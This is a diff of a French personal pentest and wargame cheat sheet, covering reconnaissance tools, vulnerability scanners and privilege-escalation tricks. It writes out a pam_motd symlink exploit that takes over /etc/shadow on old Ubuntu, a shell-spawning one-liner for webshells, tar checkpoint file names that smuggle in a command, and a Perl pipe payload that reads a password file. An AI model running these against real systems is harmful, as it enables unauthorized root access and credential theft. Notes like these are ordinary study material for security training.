@@ -11,13 +11,22 @@
 - Installer une full pour avoir metasploit
 - Les wordlists sont dans /usr/share/wordlists
 
+### Découverte environnement
+
+- robots.txt
+- Fingerprinting : $ whatweb -v -a 3 192.168.0.xxx
+- Recherche de répertoires existant: nikto ou simplement wfuzz: $wfuzz --hc 404 -w wordlist http://www.cible.com/FUZZ
+
 ### Recherche vulnerabilités
+
 
 - Banner grabbing: $nc [ip] [port] : ex donne info sur serveur web.
 - NeXpose (Rapid7), possibilite de sauver le report en xml pour relecture dans msf. Il existe aussi plugin "nexpose" pour msf.
 - Nessus (Tenable Security). Il existe aussi plugin "nessus" pour msf.
 - OpenVAS : Fork Open Source de Nessus (qui est devenu close) - Installé sur https://127.0.0.1:9392. Se paramètre via openvasmd, par exemple pour reinit le password d'admin:
-    $ openvasmd --user=admin --new-password=letmein
+    $ openvasmd --user=admin --new-password=letmein. Il y a aussi plusieurs outils d'admin comme openvas-check-setup, openvas-setup...
+    
+  Pour lancer un scan depuis l'interface : Menu Scans / tasks. Clicker sur l'icone violette avec une baguette "task wizard" et entre l'url à scanner
 
 ### Détection intrusion
 
@@ -35,36 +44,22 @@
 
 ### [Metasploit](hacking-metasploit.html)
 
-### Exploit linux
+### Wargame - Elevation de privilege
 
-Sur ubuntu non patche:
-Aujourd'hui, une faille de sécurité assez simple à mettre en oeuvre a été révélée. Elle n'impacte que la distribution Linux Ubuntu sur les versions 9.10 et 10.04.
+## Generalités
 
-Celle-ci concerne donc ce problème de sécurité qui permet à n'importe quel utilisateur loggué sur la machine d'acquérir les droits du compte root (superadmin).
+- Consulter http://exploit-db.com, http://cve.mitre.org, http://cert.ssi.gouv.fr ou encore http://www.cvedetails.com (requetable automatiquement).
+- Consulter /etc/sudoers (dès fois que ça fonctionne) et $crontab -l pour voir s'il y a des taches planifiées à exploiter
+- Pour faire un sudo ou su, il demande parfois à être dans un terminal, ce qui ne fonctionne pas avec tous les webshells. Il suffit parfois de lancer :
+$ python -c 'import pty;pty.spawn("/bin/sh")'
 
-L'exploit se base sur une faiblesse du module pam_motd qui est intégré dans la chaine d'authentification.
 
-Il est donc possible de simplement le retirer la pile pam via les fichiers de configuration ou de mettre à jour comme préconisé.
-
-Je vous communique l'exploit à titre d'information:
-
-Admettons que je sois loggué sur la machine sous l'utilisateur: franck
-
----
-
-rm -rf ~/.cache
-
-ln -s /etc/shadow ~/.cache
-
-ssh localhost
-
----
+## Ubuntu non patche (versions 9.10 et 10.04):
+$rm -rf ~/.cache
+$ln -s /etc/shadow ~/.cache
+$ssh localhost
 
 Vous voila propriétaire du fichier /etc/shadow !
-
-Ce qui vous permettra bien évidemment de récupérer l'accès root...
-
-### Wargame - Elevation de privilege
 
 ## Execution de commandes détournées (exploit suid)
 - S'il y a un "tar cvf *" par exemple, il est possible de passer des arguments sous forme de nom de fichiers. Notamment en créants des fichiers appelés --checkpoint=1 --checkpoint-action=exec=sh shell.sh et shell.sh.
@@ -115,6 +110,7 @@ L'utilisation de mimikatz permet de retrouver des credentials, par exemple à pa
 - Contournement de filtre : un preg_replace("/^blabla/"...) peut être trompé par une chaîne commençant par un "\n..."
 - Passer en argument un array (de type user[]) là où il s'attend à une valeur classique donne parfois des résultats intéressants
 - Les conversions implicites sont une source de faille. Les différentes manières d'écrire des nombres (par exemple forme exponentielle 5.14e18) peut rajouter de la confusion en laissant le champ à 2 interprétations selon le contexte 
+- $_SERVER['HTTP_HOST'] peut être modifié par le header "Host"
 
 ### Les attaques Perl
 - On peut utiliser des pipes dans un open de perl, par exemple si on appelle un fichier "|cat .passwd"...
